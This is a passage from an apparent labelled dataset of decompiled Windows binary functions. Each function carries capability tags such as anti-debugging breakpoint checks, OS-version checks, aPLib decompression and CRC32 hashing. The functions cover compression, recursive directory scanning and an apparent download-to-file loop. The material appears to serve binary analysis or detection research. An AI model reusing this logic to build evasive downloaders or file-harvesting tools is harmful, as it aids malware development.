in_stack_fffffef4 = *param_7;\n        if (*param_7 < uStack264) {\n            in_stack_fffffef4 = uStack264;\n        }\n        uVar14 = 0xf;\n        do {\n            if (auStack132[uVar14] != 0) break;\n            uVar14 = uVar14 - 1;\n        } while (uVar14 != 0);\n        if (uVar14 < in_stack_fffffef4) {\n            in_stack_fffffef4 = uVar14;\n        }\n        iVar15 = 1 << (uStack264 & 0x1f);\n        *param_7 = in_stack_fffffef4;\n        for (uVar6 = uStack264; uVar6 < uVar14; uVar6 = uVar6 + 1) {\n            if (iVar15 - auStack132[uVar6] < 0) goto code_r0x00405a19;\n            iVar15 = (iVar15 - auStack132[uVar6]) * 2;\n        }\n        uVar6 = auStack132[uVar14];\n        iVar15 = iVar15 - uVar6;\n        if (-1 < iVar15) {\n            auStack132[uVar14] = uVar6 + iVar15;\n            iVar7 = 0;\n            iVar15 = uVar14 - 1;\n            auStack68[1] = 0;\n            if (iVar15 != 0) {\n                iVar3 = 0;\n                do {\n                    iVar7 = iVar7 + *(auStack132 + iVar3 + 4);\n                    iVar15 = iVar15 + -1;\n                    *(auStack68 + iVar3 + 8) = iVar7;\n                    iVar3 = iVar3 + 4;\n                } while (iVar15 != 0);\n            }\n            uVar6 = 0;\n            do {\n                iVar15 = *param_1;\n                param_1 = param_1 + 1;\n                if (iVar15 != 0) {\n                    uVar4 = auStack68[iVar15];\n                    param_10[uVar4] = uVar6;\n                    auStack68[iVar15] = uVar4 + 1;\n                }\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < param_2);\n            uVar6 = auStack68[uVar14];\n            iVar7 = -1;\n            iVar15 = -in_stack_fffffef4;\n            uStack244 = 0;\n            auStack68[0] = 0;\n            puStack256 = param_10;\n            auStack196[1] = 0;\n            uStack240 = 0;\n            uStack260 = 0;\n            if (uStack264 <= uVar14) {\n                puStack236 = auStack132 + uStack264;\n                do {\n                    uVar4 = *puStack236;\n                    while (uVar4 != 0) {\n                        uStack232._2_2_ = uStack232 >> 0x10;\n                        uVar8 = uVar4 - 1;\n                        if (iVar15 + in_stack_fffffef4 < uStack264) {\n                            iStack216 = iVar15 - in_stack_fffffef4;\n                            iVar3 = iVar15 + in_stack_fffffef4;\n                            iVar13 = iVar7;\n                            do {\n                                iVar15 = iVar3;\n                                iStack216 = iStack216 + in_stack_fffffef4;\n                                iVar7 = iVar13 + 1;\n                                uVar11 = uVar14 - iVar15;\n                                if (in_stack_fffffef4 < uVar14 - iVar15) {\n                                    uVar11 = in_stack_fffffef4;\n                                }\n                                uVar9 = uStack264 - iVar15;\n                                uVar2 = 1 << (uVar9 & 0x1f);\n                                if ((uVar4 < uVar2) &&\n                                   (iVar3 = uVar2 + (-1 - uVar8),  puVar10 = puStack236,  uVar9 < uVar11)) {\n                                    while (uVar9 = uVar9 + 1,  uVar9 < uVar11) {\n                                        if (iVar3 * 2 <= puVar10[1]) break;\n                                        iVar3 = iVar3 * 2 - puVar10[1];\n                                        puVar10 = puVar10 + 1;\n                                    }\n                                }\n                                uStack260 = 1 << (uVar9 & 0x1f);\n                                uVar11 = uStack260 + *param_9;\n                                auStack196[0] = uVar4;\n                                if (0x5a0 < uVar11) goto code_r0x00405a19;\n                                uStack240 = param_8 + *param_9 * 8;\n                                auStack196[iVar13 + 2] = uStack240;\n                                *param_9 = uVar11;\n                                if (iVar7 == 0) {\n                                    *param_6 = uStack240;\n                                }\n                                else {\n                                    auStack68[iVar7] = uStack244;\n                                    uVar2 = uStack244 >> (iStack216 & 0x1f);\n                                    uVar11 = auStack196[iVar7];\n                                    uStack232 = uStack232 & 0xffff0000 | CONCAT11(in_stack_fffffef4, uVar9);\n                                    uStack228 = (uStack240 - uVar11 >> 3) - uVar2;\n                                    *(uVar11 + uVar2 * 8) = uStack232;\n                                    *(uVar11 + 4 + uVar2 * 8) = uStack228;\n                                }\n                                iVar3 = iVar15 + in_stack_fffffef4;\n                                iVar13 = iVar7;\n                            } while (iVar15 + in_stack_fffffef4 < uStack264);\n                        }\n                        cVar1 = uStack264;\n                        uVar12 = iVar15;\n                        if (puStack256 < param_10 + uVar6) {\n                            uStack228 = *puStack256;\n                            if (uStack228 < param_3) {\n                                uStack232._0_1_ = (-(uStack228 < 0x100) & 0xa0U) + 0x60;\n                            }\n                            else {\n                                iVar3 = (uStack228 - param_3) * 4;\n                                uStack232._0_1_ = *(iVar3 + param_5) + 'P';\n                                uStack228 = *(iVar3 + param_4);\n                            }\n                            puStack256 = puStack256 + 1;\n                        }\n                        else {\n                            uStack232._0_1_ = -0x40;\n                        }\n                        uStack232 = CONCAT31(CONCAT21(uStack232._2_2_, cVar1 - uVar12), uStack232);\n                        iVar3 = 1 << (cVar1 - uVar12 & 0x1f);\n                        uVar4 = uStack244 >> (uVar12 & 0x1f);\n                        if (uVar4 < uStack260) {\n                            puVar10 = uStack240 + uVar4 * 8;\n                            do {\n                                *puVar10 = uStack232;\n                                puVar10[1] = uStack228;\n                                uVar4 = uVar4 + iVar3;\n                                puVar10 = puVar10 + iVar3 * 2;\n                            } while (uVar4 < uStack260);\n                        }\n                        uVar11 = 1 << (cVar1 - 1U & 0x1f);\n                        uVar4 = uStack244 & uVar11;\n                        while (uVar4 != 0) {\n                            uStack244 = uStack244 ^ uVar11;\n                            uVar11 = uVar11 >> 1;\n                            uVar4 = uStack244 & uVar11;\n                        }\n                        uStack244 = uStack244 ^ uVar11;\n                        uVar4 = uVar8;\n                        if (((1 << (uVar12 & 0x1f)) - 1U & uStack244) != auStack68[iVar7]) {\n                            do {\n                                iVar15 = iVar15 - in_stack_fffffef4;\n                                iVar7 = iVar7 + -1;\n                            } while (((1 << (iVar15 & 0x1f)) - 1U & uStack244) != auStack68[iVar7]);\n                        }\n                    }\n                    uStack264 = uStack264 + 1;\n                    puStack236 = puStack236 + 1;\n                } while (uStack264 <= uVar14);\n            }\n        }\n    }\ncode_r0x00405a19:\n    fcn.00427841(in_stack_fffffef4);\n    return;\n}\n",
        "token_count": 2581
    },
    "0040fd50": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.0040fd50(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack56;\n    code *apcStack40 [3];\n    uint var_24h;\n    uint *puStack24;\n    uint32_t *puStack20;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x43b100;\n    var_18h = *in_FS_OFFSET;\n    uStack56 = *0x44d6a0 ^ &var_ch_3;\n    puStack20 = &uStack56;\n    *in_FS_OFFSET = &var_18h;\n    uVar5 = var_4h | 7;\n    uVar6 = var_4h;\n    if (uVar5 < 0x7fffffff) {\n        uVar1 = param_1[5];\n        uVar4 = uVar1 >> 1;\n        uVar6 = uVar5;\n        if ((uVar5 / 3 < uVar4) && (uVar6 = uVar4 + uVar1,  0x7ffffffe - uVar4 < uVar1)) {\n            uVar6 = 0x7ffffffe;\n        }\n    }\n    arg_8h = NULL;\n    uVar5 = uVar6 + 1;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack56;\n    if ((uVar5 != 0) &&\n       ((puVar2 = &uStack56,  0x7fffffff < uVar5 ||\n        (arg_8h = fcn.00427f31(uVar5 * 2),  puVar2 = puStack20,  arg_8h == NULL)))) {\n        puStack20 = puVar2;\n        var_24h = 0;\n        fcn.004278d8(&var_24h);\n        apcStack40[0] = vtable.std::bad_alloc.0;\n        fcn.00427fb1(apcStack40, 0x44a520);\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        puStack20 = &stack0xffffffbc;\n        fcn.0040fc60(var_4h + 1);\n        return 0x40fe2d;\n    }\n    puStack20 = puVar2;\n    puVar3 = arg_8h;\n    if (param_3 != 0) {\n        puVar3 = param_1;\n        if (7 < param_1[5]) {\n            puVar3 = *param_1;\n        }\n        puVar3 = fcn.004274e0(arg_8h, puVar3, param_3 * 2);\n    }\n    if (7 < param_1[5]) {\n        puVar3 = fcn.00427a17();\n    }\n    *param_1 = arg_8h;\n    param_1[5] = uVar6;\n    param_1[4] = param_3;\n    if (7 < uVar6) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3 * 2) = 0;\n    *in_FS_OFFSET = var_18h;\n    return puVar3;\n}\n",
        "token_count": 897
    },
    "0041a930": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nvoid __thiscall fcn.0041a930(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    int32_t *extraout_ECX;\n    uint unaff_ESI;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack44;\n    char *pcStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uchar *var_14h;\n    int32_t iStack20;\n    uint var_ch_2;\n    char *in_stack_fffffff4;\n    uint var_4h;\n    \n    iVar2 = *param_1;\n    uVar5 = (param_1[1] - iVar2) / 0x1c;\n    pcStack36 = in_stack_fffffff4;\n    var_4h = unaff_ESI;\n    if (0x9249249U - var_8h < uVar5) {\n        pcStack36 = \"vector<T> too long\";\n        var_ch_2 = 0x41a965;\n        var_8h = fcn.00426886(\"vector<T> too long\");\n        param_1 = extraout_ECX;\n    }\n    uVar5 = uVar5 + var_8h;\n    uVar4 = (param_1[2] - iVar2) / 0x1c;\n    if (uVar4 < uVar5) {\n        if (0x9249249 - (uVar4 >> 1) < uVar4) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = uVar4 + (uVar4 >> 1);\n        }\n        if (uVar4 < uVar5) {\n            uVar4 = uVar5;\n        }\n        var_ch_2 = 0x43ba50;\n        iStack20 = *in_FS_OFFSET;\n        uStack32 = var_4h;\n        uStack44 = *0x44d6a0 ^ &fcn.0041a930::var_4h;\n        var_14h = &stack0xffffffd4;\n        *in_FS_OFFSET = &stack0xffffffec;\n        uVar5 = uVar4;\n        puVar3 = &stack0xffffffd4;\n        if (0x9249249 < uVar4) {\n            fcn.00426886(\"vector<T> too long\");\n            puVar3 = var_14h;\n        }\n        var_14h = puVar3;\n        if ((param_1[2] - *param_1) / 0x1c < uVar4) {\n            iStack28 = fcn.00415ab0(uVar4);\n            fcn.00419dd0(*param_1, param_1[1], iStack28, param_1 + 3, 0, uVar5);\n            iVar2 = *param_1;\n            iVar1 = param_1[1];\n            if (iVar2 != 0) {\n                fcn.00410000(iVar2, param_1[1], param_1 + 3, uVar5);\n                fcn.00427a17(*param_1);\n            }\n            param_1[2] = iStack28 + uVar5 * 0x1c;\n            param_1[1] = iStack28 + ((iVar1 - iVar2) / 0x1c) * 0x1c;\n            *param_1 = iStack28;\n        }\n        *in_FS_OFFSET = iStack20;\n        return;\n    }\n    return;\n}\n",
        "token_count": 864
    },
    "00420260": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar * fcn.00420260(uchar *param_1, uint *param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar8;\n    int32_t *unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uVar2 = in_stack_0000001c;\n    uStack8 = 0x43c0e8;\n    piStack12 = *in_FS_OFFSET;\n    uVar3 = *0x44d6a0 ^ &stack0xffffffe0;\n    *in_FS_OFFSET = &piStack12;\n    uStack4 = 0;\n    puVar4 = param_2;\n    if (in_stack_0000001c < 0x10) {\n        puVar4 = &param_2;\n    }\n    pcVar6 = puVar4 + 1;\n    do {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar5 = puVar4 - pcVar6;\n    if (uVar5 % 3 != 0) {\n        uVar5 = (uVar5 - uVar5 % 3) + 3;\n    }\n    pcVar6 = fcn.0042740a((uVar5 * 8) / 6 + 1);\n    puVar4 = param_2;\n    if (uVar2 < 0x10) {\n        puVar4 = &param_2;\n    }\n    pcVar7 = puVar4 + 1;\n    do {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    puVar8 = param_2;\n    if (uVar2 < 0x10) {\n        puVar8 = &param_2;\n    }\n    fcn.0041cf70(puVar8, puVar4 - pcVar7, pcVar6, uVar3);\n    *(param_1 + 0x14) = 0xf;\n    *(param_1 + 0x10) = 0;\n    *param_1 = 0;\n    pcVar7 = pcVar6;\n    do {\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004052f0(pcVar6, pcVar7 - (pcVar6 + 1));\n    if (0xf < param_2) {\n        fcn.00427a17(piStack12);\n    }\n    *in_FS_OFFSET = unaff_EDI;\n    return param_1;\n}\n",
        "token_count": 671
    },
    "004229c0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint fcn.004229c0(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint16_t *puVar8;\n    int32_t iVar9;\n    \n    iVar4 = param_1;\n    *(param_1 + 0x1f2c + *(param_1 + 0x1af2c)) = param_3;\n    *(param_1 + 0x1af2c) = *(param_1 + 0x1af2c) + 1;\n    if (param_2 == 0) {\n        piVar3 = param_1 + 0x14 + param_3 * 4;\n        *piVar3 = *piVar3 + 1;\n    }\n    else {\n        piVar3 = param_1 + 0x418 + *(param_1 + 0x1b3d + param_3) * 4;\n        *piVar3 = *piVar3 + 1;\n        param_2 = param_2 + -1;\n        if (param_2 < 0x100) {\n            uVar5 = *(param_1 + 0x1c3d + param_2);\n        }\n        else {\n            uVar5 = *((param_2 >> 7) + 0x1d3d + param_1);\n        }\n        piVar3 = param_1 + 0x908 + uVar5 * 4;\n        *piVar3 = *piVar3 + 1;\n        *(param_1 + 0x9f2c + *(param_1 + 0x1af30) * 2) = param_2;\n        *(param_1 + 0x1af30) = *(param_1 + 0x1af30) + 1;\n        *(param_1 + 0x1af38) = *(param_1 + 0x1af38) | *(param_1 + 0x1af39);\n    }\n    *(param_1 + 0x1af39) = *(param_1 + 0x1af39) << 1;\n    if ((*(param_1 + 0x1af2c) & 7) == 0) {\n        *(*(param_1 + 0x1af34) + 0x19f2c + param_1) = *(param_1 + 0x1af38);\n        *(param_1 + 0x1af34) = *(param_1 + 0x1af34) + 1;\n        *(param_1 + 0x1af38) = 0x100;\n    }\n    if ((2 < *(param_1 + 4)) && ((*(param_1 + 0x1af2c) & 0xfff) == 0)) {\n        iVar9 = *(param_1 + 0x1af2c) * 8;\n        piVar1 = param_1 + 0x6af84;\n        piVar2 = param_1 + 0x6af74;\n        param_1 = 0;\n        iVar7 = 0;\n        piVar6 = 0x44662c;\n        puVar8 = iVar4 + 0x90c;\n        do {\n            iVar9 = iVar9 + puVar8[-2] * (piVar6[-1] + 5);\n            iVar7 = iVar7 + (*piVar6 + 5) * *puVar8;\n            param_1 = param_1 + puVar8[2] * (piVar6[1] + 5);\n            piVar6 = piVar6 + 3;\n            puVar8 = puVar8 + 6;\n        } while (piVar6 < 0x4466a4);\n        if ((*(iVar4 + 0x1af30) < *(iVar4 + 0x1af2c) >> 1) &&\n           ((iVar9 + iVar7 + param_1 >> 2 & 0x3ffffffe) < (*piVar1 - *piVar2 & 0xfffffffeU))) {\n            return 1;\n        }\n    }\n    if ((*(iVar4 + 0x1af2c) != 0x7fff) && (*(iVar4 + 0x1af30) != 0x8000)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 1029
    },
    "00406820": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort * fcn.00406820(int32_t param_1, uint param_2, int32_t param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    if (((param_3 != 1) && (param_3 != 2)) && (param_3 != 3)) {\n        *param_4 = 0x10000;\n        return NULL;\n    }\n    iVar4 = 0;\n    bVar5 = false;\n    *param_4 = 0;\n    param_3._0_1_ = 0;\n    if (param_3 == 1) {\n        param_3._0_1_ = 0;\n        iVar4 = param_1;\n    }\n    else {\n        if (param_3 != 2) goto code_r0x004068b1;\n        iVar4 = (**0x45fe2c)(param_1, 0x80000000, 1, 0, 3, 0x80, 0);\n        if (iVar4 == -1) {\n            *param_4 = 0x200;\n            return NULL;\n        }\n        param_3._0_1_ = 1;\n    }\n    iVar1 = (**0x45fe48)(iVar4, 0, 0, 1);\n    bVar5 = iVar1 != -1;\ncode_r0x004068b1:\n    puVar2 = fcn.00427f31(0x20);\n    if ((param_3 != 1) && (param_3 != 2)) {\n        *(puVar2 + 0xc) = param_2;\n        *(puVar2 + 10) = param_1;\n        *(puVar2 + 0xe) = 0;\n        *(puVar2 + 6) = 0;\n        *puVar2 = 0x100;\n        *(puVar2 + 8) = 0;\n        *param_4 = 0;\n        return puVar2;\n    }\n    *puVar2 = 1;\n    *(puVar2 + 8) = param_3;\n    *(puVar2 + 1) = bVar5;\n    *(puVar2 + 2) = iVar4;\n    *(puVar2 + 4) = 0;\n    *(puVar2 + 6) = 0;\n    if (bVar5 != false) {\n        uVar3 = (**0x45fe48)(iVar4, 0, 0, 1);\n        *(puVar2 + 6) = uVar3;\n    }\n    *param_4 = 0;\n    return puVar2;\n}\n",
        "token_count": 610
    },
    "0040a130": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040a130(int32_t *param_1, int32_t *param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    if (3 < param_3) {\n        do {\n            if (*param_1 != *param_2) goto code_r0x0040a15b;\n            param_3 = param_3 - 4;\n            param_2 = param_2 + 1;\n            param_1 = param_1 + 1;\n        } while (3 < param_3);\n    }\n    if (param_3 == 0) {\n        return 0;\n    }\ncode_r0x0040a15b:\n    iVar1 = *param_1 - *param_2;\n    if (iVar1 == 0) {\n        if (param_3 < 2) {\n            return 0;\n        }\n        iVar1 = *(param_1 + 1) - *(param_2 + 1);\n        if (iVar1 == 0) {\n            if (param_3 < 3) {\n                return 0;\n            }\n            iVar1 = *(param_1 + 2) - *(param_2 + 2);\n            if (iVar1 == 0) {\n                if (param_3 < 4) {\n                    return 0;\n                }\n                iVar1 = *(param_1 + 3) - *(param_2 + 3);\n            }\n        }\n    }\n    return iVar1 >> 0x1f | 1;\n}\n",
        "token_count": 337
    },
    "0040bf20": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.0040bf20(uint param_1, uint param_2, int32_t param_3, uint param_4, uint param_5, uchar *param_6)\n\n{\n    char cVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uchar *unaff_EDI;\n    int32_t in_stack_00001fd0;\n    uchar *in_stack_00001fd4;\n    uchar *in_stack_00001fd8;\n    int32_t in_stack_00001fe0;\n    uchar *in_stack_00001fe8;\n    uchar *puVar8;\n    uchar *puStackY52;\n    uchar *puStackY48;\n    \n    puVar8 = in_stack_00001fe8;\n    fcn.00428720();\n    param_6 = puVar8;\n    puVar8 = param_6;\n    (**0x45fdec)();\n    iVar4 = (**0x460058)();\n    param_3 = iVar4;\n    fcn.00427390();\n    (**0x45ff98)();\n    if (iVar4 != -1) {\n        do {\n            iVar4 = (**0x45ffc8)();\n            if (((iVar4 != 0) && (iVar4 = (**0x45ffc8)(),  iVar4 != 0)) && (iVar4 = fcn.0040a4b0(),  iVar4 != 0)) {\n                (**0x460044)();\n                puStackY48 = &stack0x00000250;\n                puStackY52 = 0x40c04c;\n                (**0x45ff98)();\n                puStackY52 = &stack0x00000030;\n                (**0x45ff98)();\n                if (puVar8 == NULL) {\n                    param_6 = &stack0xffffffcc;\n                    pcVar5 = &stack0x00000260;\n                    puStackY52 = puStackY52 & 0xffffff00;\n                    do {\n                        cVar1 = *pcVar5;\n                        pcVar5 = pcVar5 + 1;\n                    } while (cVar1 != '\\0');\n                    fcn.004052f0();\n                    iVar4 = fcn.0040bb00();\n                    if (iVar4 != 0) goto code_r0x0040c581;\n                }\n                puStackY48 = 0x40c0cf;\n                fcn.00427390();\n                puStackY48 = 0x3e8;\n                puStackY52 = NULL;\n                fcn.00427390();\n                iVar4 = (**0x45ffc8)();\n                if (iVar4 == 0) {\n                    puStackY52 = &stack0x00000840;\n                    puStackY48 = 0x4446e8;\n                    (**0x45fdec)();\n                }\n                else {\n                    puStackY52 = 0x4446ec;\n                    (**0x45fdec)();\n                }\n                puStackY48 = 0x40c13d;\n                iVar4 = (**0x45fe90)();\n                if (iVar4 < 4) {\n                    if ((in_stack_00001fe0 == 0) || (iVar4 = (**0x45fe94)(),  iVar4 == 0)) {\n                        iVar4 = (**0x45fe94)();\n                        if (iVar4 != 0) {\n                            (**0x460044)();\n                            puStackY48 = &stack0x0000014c;\n                            puStackY52 = 0x40c4c5;\n                            (**0x45ff98)();\n                            puStackY52 = &stack0x00000030;\n                            (**0x45ff98)();\n                            unaff_EDI = &stack0x0000026c;\n                            fcn.0041d1d0();\n                            puVar7 = fcn.004288e0();\n                            if (puVar7 < in_stack_00001fd4) {\n                                *0x44f3e8 = *0x44f3e8 + puVar7;\n                                if (*0x44f3e8 < *0x44f3dc) goto code_r0x0040c370;\n                                goto code_r0x0040c5a4;\n                            }\n                        }\n                    }\n                    else {\n                        (**0x45ffbc)();\n                        puStackY48 = 0x40c3e4;\n                        fcn.0040a380();\n                        (**0x45ffa0)();\n                        puStackY48 = 0x40c3fc;\n                        iVar4 = (**0x45fe94)();\n                        if (iVar4 != 0) {\n                            (**0x460044)();\n                            puStackY48 = &stack0x0000014c;\n                            puStackY52 = 0x40c426;\n                            (**0x45ff98)();\n                            puStackY52 = &stack0x0000034c;\n                            (**0x45fe54)();\n                            (**0x45ff98)();\n                            unaff_EDI = &stack0x00000370;\n                            fcn.0041d1d0();\n                            puVar7 = fcn.004288e0();\n                            if (puVar7 < in_stack_00001fd4) {\n                                *0x44f3e8 = *0x44f3e8 + puVar7;\n                                if (*0x44f3e8 < *0x44f3dc) goto code_r0x0040c2a8;\n                                goto code_r0x0040c5a4;\n                            }\n                        }\n                    }\n                }\n                else {\n                    puStackY48 = 0x40c15d;\n                    iVar4 = fcn.004287fd(&stack0x00000c30, 0x4446f4, &stack0x0000000c);\n                    bVar3 = false;\n                    bVar2 = false;\n                    if ((in_stack_00001fe0 != 0) && (iVar6 = (**0x45fe94)(),  iVar6 != 0)) {\n                        bVar2 = true;\n                        (**0x45ffbc)();\n                        puStackY48 = 0x40c1a2;\n                        fcn.0040a380();\n                        (**0x45ffa0)();\n                    }\n                    if (iVar4 != 0) {\n                        do {\n                            puStackY48 = 0x40c1cc;\n                            iVar4 = (**0x45ff08)();\n                            if (iVar4 != 0) {\n                                bVar3 = true;\n                            }\n                            puStackY48 = 0x40c1e6;\n                            iVar4 = fcn.004287fd(0, 0x444700, &stack0x0000000c);\n                        } while (iVar4 != 0);\n                        if (bVar3) goto code_r0x0040c531;\n                    }\n                    if (bVar2) {\n                        iVar4 = (**0x45fe94)();\n                        if (iVar4 != 0) {\n                            (**0x460044)();\n                            puStackY48 = &stack0x0000014c;\n                            puStackY52 = 0x40c240;\n                            (**0x45ff98)();\n                            puStackY52 = &stack0x0000034c;\n                            (**0x45fe54)();\n                            (**0x45ff98)();\n                            unaff_EDI = &stack0x00000370;\n                            fcn.0041d1d0();\n                            puVar7 = fcn.004288e0();\n                            if (puVar7 < in_stack_00001fd4) {\n                                *0x44f3e8 = *0x44f3e8 + puVar7;\n                                if (*0x44f3dc <= *0x44f3e8) goto code_r0x0040c5a4;\ncode_r0x0040c2a8:\n                                iVar4 = fcn.0040a4b0();\njoined_r0x0040c37a:\n                                if (iVar4 != 0) {\n                                    puStackY48 = 0x40c52e;\n                                    fcn.004266f0();\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        iVar4 = (**0x45fe94)();\n                        if (iVar4 != 0) {\n                            (**0x460044)();\n                            puStackY48 = &stack0x0000014c;\n                            puStackY52 = 0x40c312;\n                            (**0x45ff98)();\n                            puStackY52 = &stack0x00000030;\n                            (**0x45ff98)();\n                            unaff_EDI = &stack0x0000026c;\n                            fcn.0041d1d0();\n                            puVar7 = fcn.004288e0();\n                            if (puVar7 < in_stack_00001fd4) {\n                                *0x44f3e8 = *0x44f3e8 + puVar7;\n                                if (*0x44f3e8 < *0x44f3dc) {\ncode_r0x0040c370:\n                                    iVar4 = fcn.0040a4b0();\n                                    goto joined_r0x0040c37a;\n                                }\n                                goto code_r0x0040c5a4;\n                            }\n                        }\n                    }\n                }\ncode_r0x0040c531:\n                if (in_stack_00001fd0 != 0) {\n                    puStackY52 = in_stack_00001fd4;\n                    puStackY48 = in_stack_00001fd8;\n                    fcn.0040bf20();\n                }\n            }\ncode_r0x0040c581:\n            iVar4 = (**0x45feb0)();\n        } while (iVar4 != 0);\n        (**0x45fe20)();\n    }\ncode_r0x0040c5a4:\n    fcn.00427841(unaff_EDI);\n    return;\n}\n",
        "token_count": 2182
    },
    "00411ca0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00411ca0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uStack1376;\n    int32_t iStack1372;\n    uint uStack1368;\n    uint32_t uStack1364;\n    uint uStack1360;\n    uchar *puStack1356;\n    uint uStack1352;\n    uint uStack1340;\n    uint uStack1336;\n    uint uStack1332;\n    int32_t iStack1328;\n    uint32_t arg_8h;\n    uchar auStack1304 [4];\n    uint uStack1300;\n    uint uStack1296;\n    uint uStack1288;\n    uchar auStack1100 [16];\n    uchar auStack1084 [1080];\n    uint32_t uStack4;\n    \n    uStack4 = *0x44d6a0 ^ &stack0xfffffae8;\n    iVar5 = 0;\n    arg_8h = 0;\n    iStack1328 = 0;\n    uStack1332 = 1;\n    uStack1336 = 0x4453dd;\n    uStack1296 = param_2;\n    uStack1300 = 0;\n    uStack1288 = 0x100;\n    uStack1340 = 0x411ce7;\n    iVar1 = (**0x45fed4)();\n    if (iVar1 != 0) {\n        uStack1340 = 0x4453e0;\n        fcn.00411c10();\n        iVar2 = (**0x45ffc8)();\n        if (iVar2 == 0) {\n            iStack1328 = 1;\n        }\n        do {\n            uStack1352 = 0;\n            if (iStack1328 == 0) {\n                puStack1356 = 0x100;\n            }\n            else {\n                puStack1356 = 0x800100;\n            }\n            uStack1360 = 0;\n            uStack1364 = 0;\n            uStack1368 = param_1;\n            uStack1376 = 0x411d34;\n            iStack1372 = iVar1;\n            uVar3 = (**0x45fed8)();\n            uStack1376 = 0;\n            iVar2 = (**0x46004c)(uVar3, 0x13, &stack0xfffffac8, &stack0xfffffac4);\n            if (iVar2 != 0) {\n                uStack1352 = 0x4453e8;\n                puStack1356 = &stack0xfffffae0;\n                uStack1360 = 0x411d5f;\n                iVar2 = (**0x45ffc8)();\n                if (iVar2 == 0) break;\n                uStack1352 = 1000;\n                puStack1356 = 0x411d6e;\n                (**0x45fe08)();\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 3);\n        uStack1376 = arg_8h;\n        uStack1352 = 0;\n        puStack1356 = 0x80;\n        uStack1360 = 2;\n        uStack1364 = 0;\n        uStack1368 = 3;\n        iStack1372 = 0x40000000;\n        arg_8h = uStack1376;\n        uVar4 = (**0x45fe2c)();\n        iVar5 = (**0x45fef8)(uVar3, &stack0xfffffbc4, 0x400, &stack0xfffffab0);\n        while ((iVar5 != 0 &&\n               (((uStack1376 == 0 ||\n                 ((iVar5 = (**0x45fe98)(uVar4, &stack0xfffffbb4, uStack1376, &stack0xfffffaac, 0),  iVar5 != 0 &&\n                  (uStack1376 == uStack1364)))) && (0x3ff < uStack1376))))) {\n            iVar5 = (**0x45fef8)(uVar3, &stack0xfffffbb4, 0x400, &stack0xfffffaa0);\n        }\n        